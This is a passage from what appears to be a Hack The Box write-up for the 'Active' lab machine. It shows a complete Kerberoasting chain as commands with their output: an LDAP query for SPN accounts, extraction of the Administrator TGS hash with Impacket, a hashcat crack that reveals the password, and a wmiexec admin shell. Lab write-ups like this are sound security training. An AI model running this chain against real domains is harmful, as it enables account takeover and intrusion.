
Get users for the domain `SVC_TGS`:

```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
```

Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance. ldapsearch can be used to identify accounts that are configured with SPNs.

We reuse the previous query and add a filter to catch SPNs, (serviceprincipalname=*/*) :

```
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
serviceprincipalname | grep -B 1 servicePrincipalName

dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

It seems that the active\Administrator account has been configured with an SPN. Impacket’s GetUserSPNs.py lets us request the TGS and extract the hash for offline cracking.

```
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password: GPPstillStandingStrong2k18
SPN              Name           MemberOf
---------------  -------------  ---------------------------------------------------
active/CIFS:445   Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
<...SNIP....>

Password: GPPstillStandingStrong2k18
<...SNIP...>
[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$73fd1c3cdfb6f1085f60218dc0
5d9b90$d8728890eed6dbfd4c7ac4a90d432af56e5ceb9cdb82c3ed943d64bca639c46f67c9e2892eae6b84fad
ce3215f550ba9aac436212ecdc0cdf93adc5a33547f31907bd79d4ec8826063cd18e07493eb7eb5b1a1efe1f53
08308489f2e101432ac40a6969861ff1c93fdec9ae1abb1b237c59bb866dcc7d028297f75e3110436dc5446f3f
8d36ec58b780384b0f6c02a6f1b76e283d3ed00dcc4a69061d5e02119cb79671e17ffce51cac8967606d2b0140
77c52064ccaf42ee7d2465818d56f12bc2daa2910e92740ebeaf78cd574a3919fabb04ae86f0c93b82e05e41d5
8b1d83d85407a9577823b30125d270e4dcec1dd0c4faa4eb87fd5110c281b9cfb1f5844507421984935eb63109
88319aaeb0b0d4e91849f4e6a15c9f024558b0e982d056d8ce3fcb5eea8a5eca7db51612ae1dfba0770a54e43a
79e5af5daa4366b8c752f6f8b060de90d4c5e21d473b503f4503a26cd3834400fd19141821244862a1d65e139a
d0640aa26478638c87dc715120cb8e2bb7e4d51ac21802d3b26c1d6207022c071fe9361c0c9b96767cd9bb0ce3
c3c3fe48fa0157f4fdd7a56fda7af540ed565eefd58c7ca7f8e5cae13333695897dd3acc01eee8d7870f55955e
3fc7a5946a61424e6dd5c243abfe11716dbc2e2ca435949c5f49feb9582b7a9d2eae6f7d9aa720b786468ce6ec
7ef5b879c764e59574de70345aa79898eb26d09bb6dd3e2e8b87e96ee60cb9dbde6365a201ae307698c162ea72
41f22b964960b1916b9fcb5e1981f5fd02ed0590a9862eb3a6b5e9a14cb99c3bfb72abfd4a7faef5766ac9f05f
aff37860acb0c00cfd90d2cda321a12f3dd08ffd1a36dbd8452d5ee92f0e90f9d78c6b8228ed333984d717cc99
26a8751d7ed0c14fde671f8413c361e72a48472acffa25fc931b4db96224f14427251662a4b934190bb215e8c0
727958432cb751dd8bf81c2dcdeeb355f45b0faf80388abac80c9cabfa7ce6a7ddf36c7fa2d02c5b168d00ce72
9e555f1cba3ad455d5dfb7c8360d5c1b021a3549065eceda11e0f109c9fed1720e2a2e3a111715698c60480aae
043501b35f527fe353a4c9a03ff46c6e438e411bbcfa3ea8ee3e8fbee38d464a43304a9a0607076748a19ff94b
6ad704674f6d8a0f29a9575a4b121b1143f8376ffc98dbce58589ec356deb592808052d530baa49c3ae5af846a
9b4047ce682f7473703c5dd1d8cf585eab3082e00cfaf23289dbffa1925ba26e41c3ba7e682cb
```

#### Cracking of Kerberos TGS Hash

We use hashcat with the rockyou.txt wordlist to crack the hash and obtain the active\administrator password of Ticketmaster1968 .

```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v6.1.1) starting...

<...SNIP...>
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*Administrator$ACTIVE.HTB$<...SNIP...>:Ticketmaster1968
<...SNIP...>
Started: Mon Nov 27 12:18:48 2023
```

Impacket’s wmiexec.py can be used to get a shell as active\administrator , and read root.txt .

```
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator
```
